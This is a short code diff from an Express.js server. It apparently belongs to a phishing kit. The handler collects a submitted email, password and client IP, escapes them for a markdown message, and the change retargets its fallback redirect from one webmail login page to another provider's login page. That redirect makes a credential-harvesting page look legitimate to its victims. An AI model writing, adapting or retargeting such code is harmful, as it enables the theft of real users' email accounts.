@@ -27,7 +27,7 @@ app.post("/", async (req, res) => {
     const ip = req.clientIp || "Unknown IP";
 
     if (!email || !password) {
-        return res.redirect("https://mail.nctc.com/");
+        return res.redirect("https://mail.wabash.net/login.php");
     }
 
     const escapeMarkdown = (text) => {
